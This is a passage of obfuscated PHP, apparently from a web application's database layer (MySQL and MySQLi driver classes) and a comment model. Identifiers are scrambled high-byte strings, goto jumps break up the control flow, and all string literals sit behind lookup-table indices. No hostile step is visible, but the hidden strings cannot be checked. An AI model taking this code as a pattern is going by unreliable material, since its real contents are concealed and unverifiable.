$dŠŒ³ğ±· =& $_SERVER[¢Í]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c„ÍÃÒ‘ÕŒ; c„ÍÃÒ‘ÕŒ: $this->queryStr = $eÅÂó÷‰Ú‰; if ($this->queryID) { $this->free(); } think_action_status($dŠŒ³ğ±·[21], 1); goto AÑ‡ÅÂù¨¿; FÌÊÓò÷“: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¢Í][822], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E‘Ó× Ä = mysql_query($_SERVER[¢Í][823], $this->_linkID); $this->transTimes = 0; if (!$E‘Ó× Ä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FîëªÀ«äÑ = mysql_query($_SERVER[¢Í][824], $this->_linkID); $this->transTimes = 0; if (!$FîëªÀ«äÑ) { $this->error(); return !1; } } return !0; } private function getAll() { $A­¨¢¹™µ– = array(); if ($this->numRows > 0) { while ($E§’„Ô¥  = mysql_fetch_assoc($this->queryID)) { $A­¨¢¹™µ–[] = $E§’„Ô¥ ; } mysql_data_seek($this->queryID, 0); } return $A­¨¢¹™µ–; } public function getFields($F«ó“Ë‘Œò) { $Eİ„Ø²øìÈ =& $_SERVER[¢Í]; $EèŠ÷¾ÈÃÓ = $this->query($Eİ„Ø²øìÈ[825] . $this->parseKey($F«ó“Ë‘Œò)); $f…„Ş¸Î = array(); if ($EèŠ÷¾ÈÃÓ) { foreach ($EèŠ÷¾ÈÃÓ as $AÄá‡îôÒ£ => $e×É–£ÁÜ©) { $f…„Ş¸Î[$e×É–£ÁÜ©[$Eİ„Ø²øìÈ[27]]] = array($Eİ„Ø²øìÈ[28] => $e×É–£ÁÜ©[$Eİ„Ø²øìÈ[27]], $Eİ„Ø²øìÈ[29] => $e×É–£ÁÜ©[$Eİ„Ø²øìÈ[30]], $Eİ„Ø²øìÈ[31] => (bool) (strtoupper($e×É–£ÁÜ©[$Eİ„Ø²øìÈ[32]]) === $Eİ„Ø²øìÈ[826]), $Eİ„Ø²øìÈ[34] => $e×É–£ÁÜ©[$Eİ„Ø²øìÈ[35]], $Eİ„Ø²øìÈ[36] => strtolower($e×É–£ÁÜ©[$Eİ„Ø²øìÈ[37]]) == $Eİ„Ø²øìÈ[38], $Eİ„Ø²øìÈ[39] => strtolower($e×É–£ÁÜ©[$Eİ„Ø²øìÈ[40]]) == $Eİ„Ø²øìÈ[41]); } } return $f…„Ş¸Î; } public function getTables($D…”ÆÃâ“ = '') { $cÌÂ¤éÂô =& $_SERVER[¢Í]; if (!empty($D…”ÆÃâ“)) { $EÈµ¥‚ª½Ï = $cÌÂ¤éÂô[827] . $D…”ÆÃâ“ . $cÌÂ¤éÂô[828]; } else { $EÈµ¥‚ª½Ï = $cÌÂ¤éÂô[829]; } $cöçŒŒ•Å‡ = $this->query($EÈµ¥‚ª½Ï); $dïÍ¶â†‡Ö = array(); foreach ($cöçŒŒ•Å‡ as $b»’ß½²¦ => $A‹è—ËÓË) { $dïÍ¶â†‡Ö[$b»’ß½²¦] = current($A‹è—ËÓË); } return $dïÍ¶â†‡Ö; } public function replace($Aãöòã›‘, $a±ÜÜ‡ùá = array()) { $díØï—¥ÅÓ =& $_SERVER[¢Í]; foreach ($Aãöòã›‘ as $E¹öÊèí–¿ => $fø„¹ÇÛ‡¢) { $B¬î†àˆ = $this->parseValue($fø„¹ÇÛ‡¢); if (is_scalar($B¬î†àˆ)) { $bÄÍÀŸ­[] = $B¬î†àˆ; $bÕ“èÎËà[] = $this->parseKey($E¹öÊèí–¿); } } $eô¶“äõƒ = $díØï—¥ÅÓ[830] . $this->parseTable($a±ÜÜ‡ùá[$díØï—¥ÅÓ[282]]) . $díØï—¥ÅÓ[831] . implode($díØï—¥ÅÓ[47], $bÕ“èÎËà) . $díØï—¥ÅÓ[832] . implode($díØï—¥ÅÓ[47], $bÄÍÀŸ­) . $díØï—¥ÅÓ[833]; return $this->execute($eô¶“äõƒ); } public function insertAll($Cö²ÌÎ–, $Dæ¯µøÃ­ = array(), $a¢ğÈ÷§Æ— = false) { goto CÀªÀÍõõ‹; CÀªÀÍõõ‹: $CØÚØâ×£ =& $_SERVER[¢Í]; if (!is_array($Cö²ÌÎ–[0])) { return !1; } $f§Ö¼ìØïñ = array_keys($Cö²ÌÎ–[0]); goto dÀ¶íŒ¢Äµ; dÀ¶íŒ¢Äµ: $cé·®á…» = array(); foreach ($Cö²ÌÎ– as $Cé†¹èõÁ) { $EÜÛğœÁ• = array(); foreach ($Cé†¹èõÁ as $b®«—­¤í => $DŞ½˜¼¦·¡) { $DŞ½˜¼¦·¡ = $this->parseValue($DŞ½˜¼¦·¡); if (is_scalar($DŞ½˜¼¦·¡)) { $EÜÛğœÁ•[] = $DŞ½˜¼¦·¡; } } $cé·®á…»[] = $CØÚØâ×£[263] . implode($CØÚØâ×£[47], $EÜÛğœÁ•) . $CØÚØâ×£[833]; } array_walk($f§Ö¼ìØïñ, array($this, $CØÚØâ×£[834])); goto BÅÙ“””´; BÅÙ“””´: $D¹óè•¼ï  = ($a¢ğÈ÷§Æ— ? $CØÚØâ×£[835] : $CØÚØâ×£[836]) . $CØÚØâ×£[837] . $this->parseTable($Dæ¯µøÃ­[$CØÚØâ×£[282]]) . $CØÚØâ×£[831] . implode($CØÚØâ×£[47], $f§Ö¼ìØïñ) . $CØÚØâ×£[838] . implode($CØÚØâ×£[47], $cé·®á…»); return $this->execute($D¹óè•¼ï ); goto e´™ÖÒÂí; e´™ÖÒÂí: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $C­­Ï¬‹Ï =& $_SERVER[¢Í]; $this->error = mysql_errno() . $C­­Ï¬‹Ï[4] . mysql_error($this->_linkID); if ($C­­Ï¬‹Ï[33] != $this->queryStr) { $this->error .= LNG($C­­Ï¬‹Ï[45]) . $this->queryStr; } think_trace($this->error, $C­­Ï¬‹Ï[33], $C­­Ï¬‹Ï[46]); return $this->error; } public function escapeString($cä˜¨Šõåø) { if ($this->_linkID) { return mysql_real_escape_string($cä˜¨Šõåø, $this->_linkID); } else { return mysql_escape_string($cä˜¨Šõåø); } } public function parseKey(&$Eè±ÛÚÅóó, $c¹éµØ§¹ = true) { $F¼Š­Î£Ñã =& $_SERVER[¢Í]; if ($c¹éµØ§¹) { $Eè±ÛÚÅóó = $this->parseKeyCheck($Eè±ÛÚÅóó); } if ($Eè±ÛÚÅóó != $F¼Š­Î£Ñã[190] && !preg_match($F¼Š­Î£Ñã[839], $Eè±ÛÚÅóó)) { $Eè±ÛÚÅóó = $F¼Š­Î£Ñã[384] . trim($Eè±ÛÚÅóó, $F¼Š­Î£Ñã[384]) . $F¼Š­Î£Ñã[384]; } return $Eè±ÛÚÅóó; } } class DbMysqli extends Db { public function __construct($aÀœÕåë¨Ì = '') { $eÍÀë¿Ø˜ƒ =& $_SERVER[¢Í]; if (!extension_loaded($eÍÀë¿Ø˜ƒ[740])) { think_exception(think_lang($eÍÀë¿Ø˜ƒ[10]) . $eÍÀë¿Ø˜ƒ[840]); } if (!empty($aÀœÕåë¨Ì)) { $this->config = $aÀœÕåë¨Ì; if (empty($this->config[$eÍÀë¿Ø˜ƒ[13]])) { $this->config[$eÍÀë¿Ø˜ƒ[13]] = $eÍÀë¿Ø˜ƒ[33]; } } } public function connect($D‹‰´‰‰£ = '', $FŞªÁæ«‰† = 0) { $b…ÑœÊ”¤´ =& $_SERVER[¢Í]; if (!isset($this->linkID[$FŞªÁæ«‰†])) { goto F‹…Ãñ; F‹…Ãñ: if (empty($D‹‰´‰‰£)) { $D‹‰´‰‰£ = $this->config; } $this->linkID[$FŞªÁæ«‰†] = new mysqli($D‹‰´‰‰£[$b…ÑœÊ”¤´[814]], $D‹‰´‰‰£[$b…ÑœÊ”¤´[816]], $D‹‰´‰‰£[$b…ÑœÊ”¤´[817]], $D‹‰´‰‰£[$b…ÑœÊ”¤´[17]], $D‹‰´‰‰£[$b…ÑœÊ”¤´[815]] ? intval($D‹‰´‰‰£[$b…ÑœÊ”¤´[815]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto B ¦”ƒ“àÂ; B ¦”ƒ“àÂ: $fô¾¡‘¢– = $this->linkID[$FŞªÁæ«‰†]->server_version; $this->linkID[$FŞªÁæ«‰†]->query($b…ÑœÊ”¤´[818] . think_config($b…ÑœÊ”¤´[819]) . $b…ÑœÊ”¤´[65]); if ($fô¾¡‘¢– > $b…ÑœÊ”¤´[820]) { $this->linkID[$FŞªÁæ«‰†]->query($b…ÑœÊ”¤´[821]); } goto dæ³ƒã´ˆ‰; dæ³ƒã´ˆ‰: $this->connected = !0; if (1 != think_config($b…ÑœÊ”¤´[18])) { unset($this->config); } goto bÓïö÷ˆ›ì; bÓïö÷ˆ›ì: } return $this->linkID[$FŞªÁæ«‰†]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Eñ‡½ƒŠ·) { goto b¡×¾§…—; FŠ‹Ï±«³÷: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto f¬è«ÃËß¦; F˜èèğóê: $this->queryStr = $Eñ‡½ƒŠ·; if ($this->queryID) { $this->free(); } think_action_status($DÏ›Úö¹À¬[19], 1); goto B¤ğ’¨˜Ï; b¡×¾§…—: $DÏ›Úö¹À¬ =& $_SERVER[¢Í]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F˜èèğóê; B¤ğ’¨˜Ï: think_status($DÏ›Úö¹À¬[20]); $this->queryID = $this->_linkID->query($Eñ‡½ƒŠ·); if ($this->_linkID->more_results()) { while (($B®åÕõÓ¨ë = $this->_linkID->next_result()) != NULL) { $B®åÕõÓ¨ë->free_result(); } } goto FŠ‹Ï±«³÷; f¬è«ÃËß¦: } public function execute($eéÆ¼Š„×Ä) { goto e¸³ ÙÕâº; C›ˆÅİ‰¨: $this->queryStr = $eéÆ¼Š„×Ä; if ($this->queryID) { $this->free(); } think_action_status($F½˜µ”“½„[21], 1); goto c¤•ÖË‰›; d…œ£ñ‹Ò: if (!1 === $D¨Ü¾É¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto a„–£¨˜Ø–; c¤•ÖË‰›: think_status($F½˜µ”“½„[20]); $D¨Ü¾É¼ = $this->_linkID->query($eéÆ¼Š„×Ä); $this->debug(); goto d…œ£ñ‹Ò; e¸³ ÙÕâº: $F½˜µ”“½„ =& $_SERVER[¢Í]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C›ˆÅİ‰¨; a„–£¨˜Ø–: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÈ¨Ú¹”µ‹ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$AÈ¨Ú¹”µ‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c ”¥îÇ†Ã = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c ”¥îÇ†Ã) { $this->error(); return !1; } } return !0; } private function getAll() { $a×¦Ÿ˜‘³É = array(); if ($this->numRows > 0) { for ($fÌéˆîñàÉ = 0; $fÌéˆîñàÉ < $this->numRows; $fÌéˆîñàÉ++) { $a×¦Ÿ˜‘³É[$fÌéˆîñàÉ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $a×¦Ÿ˜‘³É; } public function getFields($b¶Üõì®Ğ¿) { $f¥–µ¨‡¤ =& $_SERVER[¢Í]; $FĞèäïç¹ = $this->query($f¥–µ¨‡¤[825] . $this->parseKey($b¶Üõì®Ğ¿)); $cøâ³ÎÆ˜š = array(); if ($FĞèäïç¹) { foreach ($FĞèäïç¹ as $BâË¸²àèæ => $Fğ¬¨¾‡§ó) { $cøâ³ÎÆ˜š[$Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[27]]] = array($f¥–µ¨‡¤[28] => $Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[27]], $f¥–µ¨‡¤[29] => $Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[30]], $f¥–µ¨‡¤[31] => (bool) ($Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[32]] === $f¥–µ¨‡¤[33]), $f¥–µ¨‡¤[34] => $Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[35]], $f¥–µ¨‡¤[36] => strtolower($Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[37]]) == $f¥–µ¨‡¤[38], $f¥–µ¨‡¤[39] => strtolower($Fğ¬¨¾‡§ó[$f¥–µ¨‡¤[40]]) == $f¥–µ¨‡¤[41]); } } return $cøâ³ÎÆ˜š; } public function getTables($B»´İÎ‰¬ß = '') { $båÖíéÏ·ø =& $_SERVER[¢Í]; $D½‚ØŒÃŞ = !empty($B»´İÎ‰¬ß) ? $båÖíéÏ·ø[827] . $B»´İÎ‰¬ß . $båÖíéÏ·ø[828] : $båÖíéÏ·ø[829]; $a„ß‚ó§Ü = $this->query($D½‚ØŒÃŞ); $eœ—Ä‰Ùï‘ = array(); if ($a„ß‚ó§Ü) { foreach ($a„ß‚ó§Ü as $E¶Ş‘õ…’ù => $aÂò¾Â½‰×) { $eœ—Ä‰Ùï‘[$E¶Ş‘õ…’ù] = current($aÂò¾Â½‰×); } } return $eœ—Ä‰Ùï‘; } public function replace($cãÑ«õÜÔØ, $Eõ¥ÃÓ˜·å = array()) { $fö³¢Ü° =& $_SERVER[¢Í]; foreach ($cãÑ«õÜÔØ as $F½ÀÜÓéº¹ => $DÙ˜Ï°ÌÄ) { $e”ö›’®½ = $this->parseValue($DÙ˜Ï°ÌÄ); if (is_scalar($e”ö›’®½)) { $EŠ¼—õ…œ­[] = $e”ö›’®½; $Eƒï¹„îö[] = $this->parseKey($F½ÀÜÓéº¹); } } $B ¤íÈ›ƒ = $fö³¢Ü°[830] . $this->parseTable($Eõ¥ÃÓ˜·å[$fö³¢Ü°[282]]) . $fö³¢Ü°[831] . implode($fö³¢Ü°[47], $Eƒï¹„îö) . $fö³¢Ü°[832] . implode($fö³¢Ü°[47], $EŠ¼—õ…œ­) . $fö³¢Ü°[833]; return $this->execute($B ¤íÈ›ƒ); } public function insertAll($b½à÷Óè, $E…ÆºÔ³æÛ = array(), $bÁ®ŠŞÎ³ = false) { goto C’¹¦ØĞ‚; bóİ¡éèÜ‰: $cŞ»Ç¾§•ğ = ($bÁ®ŠŞÎ³ ? $AéË÷‘›‚…[835] : $AéË÷‘›‚…[836]) . $AéË÷‘›‚…[837] . $this->parseTable($E…ÆºÔ³æÛ[$AéË÷‘›‚…[282]]) . $AéË÷‘›‚…[831] . implode($AéË÷‘›‚…[47], $F¶‡Û°à¼‹) . $AéË÷‘›‚…[838] . implode($AéË÷‘›‚…[47], $bØÏîµªÖ); return $this->execute($cŞ»Ç¾§•ğ); goto FÀªŠ„™É¥; A•Ÿ…ÅĞßƒ: $bØÏîµªÖ = array(); foreach ($b½à÷Óè as $a÷‡ÒÎ¬ëº) { $E«Ü²Öƒæñ = array(); foreach ($a÷‡ÒÎ¬ëº as $Bàçƒ­Æ× => $cˆĞÄÇÌİ¸) { $cˆĞÄÇÌİ¸ = $this->parseValue($cˆĞÄÇÌİ¸); if (is_scalar($cˆĞÄÇÌİ¸)) { $E«Ü²Öƒæñ[] = $cˆĞÄÇÌİ¸; } } $bØÏîµªÖ[] = $AéË÷‘›‚…[263] . implode($AéË÷‘›‚…[47], $E«Ü²Öƒæñ) . $AéË÷‘›‚…[833]; } array_walk($F¶‡Û°à¼‹, array($this, $AéË÷‘›‚…[834])); goto bóİ¡éèÜ‰; C’¹¦ØĞ‚: $AéË÷‘›‚… =& $_SERVER[¢Í]; if (!is_array($b½à÷Óè[0])) { return !1; } $F¶‡Û°à¼‹ = array_keys($b½à÷Óè[0]); goto A•Ÿ…ÅĞßƒ; FÀªŠ„™É¥: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B‰Â‰¼âìñ =& $_SERVER[¢Í]; $this->error = $this->_linkID->errno . $B‰Â‰¼âìñ[4] . $this->_linkID->error; if ($B‰Â‰¼âìñ[33] != $this->queryStr) { $this->error .= LNG($B‰Â‰¼âìñ[45]) . $this->queryStr; } think_trace($this->error, $B‰Â‰¼âìñ[33], $B‰Â‰¼âìñ[46]); return $this->error; } public function escapeString($c“½È¹“Ä) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c“½È¹“Ä); } else { return addslashes($c“½È¹“Ä); } } public function parseKey(&$D¸»Á¦îÃÜ, $bƒöÌÑµ¡ù = true) { $Dãæ¶ß¡æÀ =& $_SERVER[¢Í]; if ($bƒöÌÑµ¡ù) { $D¸»Á¦îÃÜ = $this->parseKeyCheck($D¸»Á¦îÃÜ); } if ($D¸»Á¦îÃÜ != $Dãæ¶ß¡æÀ[190] && !preg_match($Dãæ¶ß¡æÀ[839], $D¸»Á¦îÃÜ)) { $D¸»Á¦îÃÜ = $Dãæ¶ß¡æÀ[384] . trim($D¸»Á¦îÃÜ, $Dãæ¶ß¡æÀ[384]) . $Dãæ¶ß¡æÀ[384]; } return $D¸»Á¦îÃÜ; } } goto B‰§Ø•¾®Ä; FŠ‘Ù¤‘½: define($_SERVER[¢Í][570], $_SERVER[¢Í][571]); $eÌŒ±Á¦‰Ø = $_SERVER[¢Í][572]; if (strlen($eÌŒ±Á¦‰Ø) < $_SERVER[¢Í][573]) { return; } goto d¶Ğ¿®ÃÓè; dëŸ­é‚«Ô: define($_SERVER[¢Í][241], 1); define($_SERVER[¢Í][242], 2); define($_SERVER[¢Í][243], 3); goto báÍÚï’À; E§…®¿”ö£: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\145" => "\143\157\155\155\145\156\x74\x5f\155\x65\164\141", "\155\x65\164\141\x46\151\x65\154\x64" => "\143\157\x6d\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a„”…µˆ—°) { $F®¯ÕÆĞá =& $_SERVER[¢Í]; if ($a„”…µˆ—°[$F®¯ÕÆĞá[1676]]) { $AÚ­ê²Í…Š = $this->where(array($F®¯ÕÆĞá[1677] => $a„”…µˆ—°[$F®¯ÕÆĞá[1676]]))->find(); if (!$AÚ­ê²Í…Š || $AÚ­ê²Í…Š[$F®¯ÕÆĞá[396]] != $a„”…µˆ—°[$F®¯ÕÆĞá[396]] || $AÚ­ê²Í…Š[$F®¯ÕÆĞá[482]] != $a„”…µˆ—°[$F®¯ÕÆĞá[482]]) { return !1; } $this->where(array($F®¯ÕÆĞá[1677] => $a„”…µˆ—°[$F®¯ÕÆĞá[1676]]))->setAdd($F®¯ÕÆĞá[1678], 1); } $a„”…µˆ—°[$F®¯ÕÆĞá[1679]] = 0; $a„”…µˆ—°[$F®¯ÕÆĞá[1678]] = 0; $a„”…µˆ—°[$F®¯ÕÆĞá[703]] = 1; return $this->add($a„”…µˆ—°); } public function commentCount($fª¼½¿«Ó†, $f”¡ÖÈƒá) { goto F›»˜í‡ÊÆ; bÏ‹ŠÖµÇƒ: $a—ŠĞÊÔÖñ = $AíÙØÛ¯µŠ[1680]; $F‡§Ï«æ²ô = array($AíÙØÛ¯µŠ[482] => array($AíÙØÛ¯µŠ[7], $fª¼½¿«Ó†), $AíÙØÛ¯µŠ[396] => $f”¡ÖÈƒá); $e¾¸ÉÂ¨„¦ = $this->field($a—ŠĞÊÔÖñ)->where($F‡§Ï«æ²ô)->group($AíÙØÛ¯µŠ[482])->select(); goto CáªöèÖŠ¹; F›»˜í‡ÊÆ: $AíÙØÛ¯µŠ =& $_SERVER[¢Í]; if (!$fª¼½¿«Ó†) { return array(); } if (is_string($fª¼½¿«Ó†) || is_int($fª¼½¿«Ó†)) { $fª¼½¿«Ó† = array($fª¼½¿«Ó†); } goto bÏ‹ŠÖµÇƒ; CáªöèÖŠ¹: return array_to_keyvalue($e¾¸ÉÂ¨„¦, $AíÙØÛ¯µŠ[482], $AíÙØÛ¯µŠ[1681]); goto b÷–®‡–ñ; b÷–®‡–ñ: } public function remove($dˆ¸²çÜ¼) { $a›«‚·ŒÂÁ =& $_SERVER[¢Í]; $aê…— µê— = array($a›«‚·ŒÂÁ[1677] => $dˆ¸²çÜ¼); $D³Ëò›Ä–‰ = $this->where($aê…— µê—)->find(); if ($D³Ëò›Ä–‰[$a›«‚·ŒÂÁ[1676]]) { $this->where(array($a›«‚·ŒÂÁ[1677] => $D³Ëò›Ä–‰[$a›«‚·ŒÂÁ[1676]]))->setAdd($a›«‚·ŒÂÁ[1678], -1); } return $this->where($aê…— µê—)->delete(); } public function edit($Fß²Óö±×, $DÄ ¦ŠîÃ) { $B§ƒŸï°ßä =& $_SERVER[¢Í]; $F½•ÕÈ¿¾ˆ = array($B§ƒŸï°ßä[1677] => $Fß²Óö±×); return $this->where($F½•ÕÈ¿¾ˆ)->save(array($B§ƒŸï°ßä[1682] => $DÄ ¦ŠîÃ)); } public function prasise($báÈËÖõ÷Ö) { $cÍ‰–ÙŠ¨Ù =& $_SERVER[¢Í]; $fÙğŞé¢£ù = Model($cÍ‰–ÙŠ¨Ù[1683]); $C¾ß³°—†™ = array($cÍ‰–ÙŠ¨Ù[1677] => $báÈËÖõ÷Ö, $cÍ‰–ÙŠ¨Ù[1481] => USER_ID); $cš‡¨ö¹œ = $fÙğŞé¢£ù->where($C¾ß³°—†™)->find(); if (!$cš‡¨ö¹œ) { $fÙğŞé¢£ù->add($C¾ß³°—†™); $fğ¶¯²ÏŠ = $this->where(array($cÍ‰–ÙŠ¨Ù[1677] => $báÈËÖõ÷Ö))->setAdd($cÍ‰–ÙŠ¨Ù[1679], 1); } else { $fÙğŞé¢£ù->where($C¾ß³°—†™)->delete(); $fğ¶¯²ÏŠ = $this->where(array($cÍ‰–ÙŠ¨Ù[1677] => $báÈËÖõ÷Ö))->setAdd($cÍ‰–ÙŠ¨Ù[1679], -1); } return $fğ¶¯²ÏŠ; } public function targetInfo($F¢ÙŒ¬Ÿ‹Ğ, $CÛìè‹ÌœË) { goto cä¶Øä°¨§; cä¶Øä°¨§: $D›Åäç·â‰ =& $_SERVER[¢Í]; $B«†ŒÖèÃï = array($D›Åäç·â‰[547] => $F¢ÙŒ¬Ÿ‹Ğ, $D›Åäç·â‰[548] => $CÛìè‹ÌœË); $aÈÉÒÖ¡öŒ = $this->where($B«†ŒÖèÃï)->count(); goto dõÑŠØæ·; e²ê«áí«ù: return $b’ß§æ¬Ï¯; goto F×ïÒí‚Ø™; dõÑŠØæ·: $dî‚Õâæ¢“ = "\122\x49\107\110\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x63\157\155\x6d\x65\156\164\x5f\x70\162\141\x69\x73\x65\x20\x73\x74\141\x72\x20\x6f\x6e\x20\143\x6f\155\155\145\x6e\164\x2e\143\157\x6d\x6d\x65\156\x74\x49\x44\40\75\x20\x73\x74\141\x72\56\x63\x6f\155\x6d\x65\156\x74\x49\x44"; $eà¼Ú£ˆ” = $this->alias($D›Åäç·â‰[357])->where($B«†ŒÖèÃï)->join($dî‚Õâæ¢“, $D›Åäç·â‰[1684])->count(); $b’ß§æ¬Ï¯ = array($D›Åäç·â‰[1685] => $aÈÉÒÖ¡öŒ, $D›Åäç·â‰[1686] => $eà¼Ú£ˆ”); goto e²ê«áí«ù; F×ïÒí‚Ø™: } public function listData($A­•”óèİí) { $e”ÅùãÀñç =& $_SERVER[¢Í]; if (isset($A­•”óèİí[$e”ÅùãÀñç[1687]])) { if ($A­•”óèİí[$e”ÅùãÀñç[1687]]) { $A­•”óèİí[$e”ÅùãÀñç[1688]] = array($e”ÅùãÀñç[939], intval($A­•”óèİí[$e”ÅùãÀñç[1687]])); } unset($A­•”óèİí[$e”ÅùãÀñç[1687]]); } if (isset($A­•”óèİí[$e”ÅùãÀñç[1689]])) { if ($A­•”óèİí[$e”ÅùãÀñç[1689]]) { $A­•”óèİí[$e”ÅùãÀñç[1688]] = array($e”ÅùãÀñç[936], intval($A­•”óèİí[$e”ÅùãÀñç[1689]])); } unset($A­•”óèİí[$e”ÅùãÀñç[1689]]); } return $this->_listData($A­•”óèİí); } private function _listData($AÜ£Ø­§‡) { $a­¿“‹¹Ù» =& $_SERVER[¢Í]; $FµïˆØŠ¹É = $this->where($AÜ£Ø­§‡)->_makeOrder()->selectPage(100); $this->_listAppendParent($FµïˆØŠ¹É[$a­¿“‹¹Ù»[370]]); $this->_listAppendUser($FµïˆØŠ¹É[$a­¿“‹¹Ù»[370]]); $this->_listAppendMeta($FµïˆØŠ¹É[$a­¿“‹¹Ù»[370]]); return $FµïˆØŠ¹É; } private function _makeOrder() { $fÔØôâ =& $_SERVER[¢Í]; $dİ§²–ô‹ã = array($fÔØôâ[1679], $fÔØôâ[1678], $fÔØôâ[200]); $eŠÄ‡öÆ§— = Input::get($fÔØôâ[432], $fÔØôâ[7], $fÔØôâ[414], $dİ§²–ô‹ã); $DŒª”×¦Õ¹ = Input::get($fÔØôâ[433], $fÔØôâ[7], $fÔØôâ[1483], array($fÔØôâ[1690], $fÔØôâ[430])); $DµÁÒèäìä = $eŠÄ‡öÆ§— . $fÔØôâ[50] . $DŒª”×¦Õ¹; return $this->order($DµÁÒèäìä); } private function _listAppendParent(&$b¸‚ïÍùğš) { goto c¬ØÜªªÜ¬; D‡Áó‘Í‘Æ: if (!$DªÇª†„àœ) { return; } $b¼Í‡¡•÷ñ = $this->where(array($EÚùÂ»Œ‡[1677] => array($EÚùÂ»Œ‡[7], $DªÇª†„àœ)))->select(); $b¼Í‡¡•÷ñ = array_to_keyvalue($b¼Í‡¡•÷ñ, $EÚùÂ»Œ‡[1688]); goto fÚîê­¶Á; fÚîê­¶Á: foreach ($b¸‚ïÍùğš as &$D‹ßİ»âĞ“) { if (isset($b¼Í‡¡•÷ñ[$D‹ßİ»âĞ“[$EÚùÂ»Œ‡[1676]]])) { $D‹ßİ»âĞ“[$EÚùÂ»Œ‡[1691]] = $b¼Í‡¡•÷ñ[$D‹ßİ»âĞ“[$EÚùÂ»Œ‡[1676]]]; } } unset($D‹ßİ»âĞ“); goto Dí†ØÊËğ; c¬ØÜªªÜ¬: $EÚùÂ»Œ‡ =& $_SERVER[¢Í]; $DªÇª†„àœ = array_unique(array_to_keyvalue($b¸‚ïÍùğš, $EÚùÂ»Œ‡[33], $EÚùÂ»Œ‡[1676])); $DªÇª†„àœ = array_remove_value($DªÇª†„àœ, $EÚùÂ»Œ‡[494]); goto D‡Áó‘Í‘Æ; Dí†ØÊËğ: } private function _listAppendUser(&$BùÒ´˜×¸¢) { goto d¿Š‰‚š‰¿; EÙ—Ùçêñ: if (count($a £ÃÓßöÊ) == 0) { return; } foreach ($BùÒ´˜×¸¢ as $bßõÄíç¿) { if (isset($bßõÄíç¿[$BÔğ†å…±[1691]])) { $a £ÃÓßöÊ[] = $bßõÄíç¿[$BÔğ†å…±[1691]][$BÔğ†å…±[1489]]; } } $cÇÍ­õ‡ã = Model($BÔğ†å…±[503])->userListInfo($a £ÃÓßöÊ); goto e·»åƒÄÆ»; d¿Š‰‚š‰¿: $BÔğ†å…± =& $_SERVER[¢Í]; $a £ÃÓßöÊ = array_unique(array_to_keyvalue($BùÒ´˜×¸¢, $BÔğ†å…±[33], $BÔğ†å…±[1489])); $a £ÃÓßöÊ = array_remove_value($a £ÃÓßöÊ, $BÔğ†å…±[494]); goto EÙ—Ùçêñ; e·»åƒÄÆ»: foreach ($BùÒ´˜×¸¢ as &$bßõÄíç¿) { $bßõÄíç¿[$BÔğ†å…±[560]] = $cÇÍ­õ‡ã[$bßõÄíç¿[$BÔğ†å…±[1489]]]; if (isset($bßõÄíç¿[$BÔğ†å…±[1691]])) { $bßõÄíç¿[$BÔğ†å…±[1691]][$BÔğ†å…±[560]] = $cÇÍ­õ‡ã[$bßõÄíç¿[$BÔğ†å…±[1691]][$BÔğ†å…±[1489]]]; } } unset($bßõÄíç¿); goto AÀÅœÉõ¹; AÀÅœÉõ¹: } private function _listAppendMeta(&$aŒàê×®ÖĞ) { goto A¥×†‘œ»¤; F¸Ğ¯·Ò¬œ: if (!$DÓ‹’Í›ŒŠ) { return; } foreach ($aŒàê×®ÖĞ as $c´ëˆˆªÉÆ) { if (isset($c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1691]])) { $DÓ‹’Í›ŒŠ[] = $c´ëˆˆªÉÆ[$eÔæ„Ëµ–ö[1691]][$eÔæ„Ëµ–ö[1688]]; } } $DÃğÁ»«°‘ = $this->metaList($DÓ‹’Í›ŒŠ); goto DÇÑÖÄæéò; A¥×†‘œ»¤: $eÔæ„Ëµ–ö =& $_SERVER[¢Í]; $DÓ‹’Í›ŒŠ = array_unique(array_to_keyvalue($aŒàê×®ÖĞ, $eÔæ„Ëµ–ö[33], $eÔæ„Ëµ–ö[1688])); $DÓ‹’Í›ŒŠ = array_remove_value($DÓ‹’Í›ŒŠ, $eÔæ„Ëµ–ö[494]); goto F¸Ğ¯·Ò¬œ; DÇÑÖÄæéò: if (!$DÃğÁ»«°‘) { return !1; } foreach 